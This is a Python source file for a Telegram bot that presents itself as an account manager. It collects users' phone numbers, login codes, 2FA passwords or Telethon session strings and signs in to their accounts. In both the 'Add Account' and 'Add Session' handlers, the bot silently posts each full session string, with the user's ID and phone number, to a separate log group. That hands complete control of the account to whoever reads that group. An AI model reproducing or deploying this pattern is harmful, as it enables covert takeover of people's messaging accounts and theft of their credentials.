from manager import bot, LOG_GROUP
from manager.events import Cmd
from telethon import Button
from telethon.sessions import StringSession
from manager.database import DB
from manager.functions import TClient, get_flag
from . import main_menu, back_menu
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneNumberFloodError,
    PhoneNumberBannedError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
)
import random
import re
import os
import time
import requests
import glob

@Cmd(pattern="Add Account 📥")
async def add_account(event):
    async with bot.conversation(event.chat_id) as conv:
        send = await event.reply("**📱 Ok, Send Your Phone Number:**\n\n__• Ex: +19307777777 __", buttons=back_menu)
        response = await conv.get_response(send.id)
        phone = response.text
    flag = get_flag(phone)
    if phone in DB.get_key("CMD_LIST"):
        return
    edit = await event.reply("`♻️ Please Wait . . .`")
    client = await TClient()
    try:
        scode = await client.send_code_request(phone, force_sms=False)
        async with bot.conversation(event.chat_id) as conv:
            send = await edit.edit(f"**💎 Ok, Send Your Telegram Code For Your Phone:** ( {flag} `{phone}` {flag} )")
            response = await conv.get_response(send.id)
            phone_code = response.text
        if phone_code in DB.get_key("CMD_LIST"):
            return
    except (PhoneNumberInvalidError, TypeError):
        await edit.edit("**❌ Your Phone Number Is Invalid!**")
        return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
    except PhoneNumberFloodError:
        await edit.edit("**❓ Your Phone Number Is Flooded!**")
        return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
    except PhoneNumberBannedError:
        await edit.edit("**🚫 Your Phone Number Is Banned!**")
        return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
    edit = await event.reply("`♻️ Please Wait . . .`")
    phone_code = phone_code.replace(" ", "")
    try:
        await client.sign_in(phone=phone, code=phone_code, password=None)
        session = client.session.save()
        allaccs = DB.get_key("USER_ACCS")[event.sender_id]
        if phone not in allaccs:
            all = DB.get_key("USER_ACCS_COUNT")
            all[event.sender_id] += 1
            DB.set_key("USER_ACCS_COUNT", all)
        allaccs = DB.get_key("USER_ACCS")
        allaccs[event.sender_id][phone] = session
        DB.set_key("USER_ACCS", allaccs)
        newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
        await bot.send_message(LOG_GROUP, newacc)
        buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
        await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n**❓ Do You Want To Edit Your Account?**", buttons=buttons)
    except (PhoneCodeInvalidError, TypeError):
        await edit.edit("**❌ Your Code Is Invalid, Try Again!**")
        return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
    except PhoneCodeExpiredError:
        await edit.edit("**🚫 Your Code Is Expired, Try Again!**")
        return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
    except SessionPasswordNeededError:
        async with bot.conversation(event.chat_id) as conv:
            send = await edit.edit(f"**🔐 Ok, Send Your Account 2Fa Password For Your Phone:** ( {flag} `{phone}` {flag} )")
            response = await conv.get_response(send.id)
            password = response.text
        if password in DB.get_key("CMD_LIST"):
            return
        edit = await event.reply("`♻️ Please Wait . . .`")
        try:
            await client.sign_in(password=password)
            session = client.session.save()
            allaccs = DB.get_key("USER_ACCS")[event.sender_id]
            if phone not in allaccs:
                all = DB.get_key("USER_ACCS_COUNT")
                all[event.sender_id] += 1
                DB.set_key("USER_ACCS_COUNT", all)
            allaccs = DB.get_key("USER_ACCS")
            allaccs[event.sender_id][phone] = session
            DB.set_key("USER_ACCS", allaccs)
            newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
            await bot.send_message(LOG_GROUP, newacc)
            buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
            await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n** ❓Do You Want To Edit Your Account?**", buttons=buttons)
        except PasswordHashInvalidError:
            await edit.edit("**❌ Your Account Password Is Invalid, Try Again!**")
            return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
        except Exception as error:
            await edit.edit(error)
            return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
    except Exception as error:
        return await edit.edit(error)

@Cmd(pattern="Add Session 🔗")
async def add_session(event):
    async with bot.conversation(event.chat_id) as conv:
        send = await event.reply("**🧬 Ok, Send Your Telethon Session String:**", buttons=back_menu)
        response = await conv.get_response(send.id)
        session = response.text
    if session in DB.get_key("CMD_LIST"):
        return
    edit = await event.reply("`♻️ Please Wait . . .`")
    client = await TClient(session)
    if not client:
        await edit.edit("**❌ Your Telethon Session String Is Invalid!**")
        return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
    myinfo = await client.get_me()
    phone = "+" + str(myinfo.phone)
    if not phone:
        await edit.edit("**❌ Your Telethon Session String Is Not For A Account!**")
        return await event.respond("**♻️ Main Menu:**", buttons=main_menu(event))
    flag = get_flag(phone)
    allaccs = DB.get_key("USER_ACCS")[event.sender_id]
    if phone not in allaccs:
        all = DB.get_key("USER_ACCS_COUNT")
        all[event.sender_id] += 1
        DB.set_key("USER_ACCS_COUNT", all)
    allaccs = DB.get_key("USER_ACCS")
    allaccs[event.sender_id][phone] = session
    DB.set_key("USER_ACCS", allaccs)
    newacc = f"**#NewAccount**\n\n**💎 User:** ( `{event.sender_id}` )\n\n{flag} `{phone}` {flag}\n\n**• Session:**\n`{session}`"
    await bot.send_message(LOG_GROUP, newacc)
    buttons = [[Button.inline("✅ Yes ✅", data=f"yesedit:{phone}"), Button.inline("❌ No ❌", data=f"noedit:{phone}")]]
    await edit.edit(f"**✅ Successfuly Login To Your Account!**\n\n {flag} `{phone}` {flag} \n\n** ❓Do You Want To Edit Your Account?**", buttons=buttons)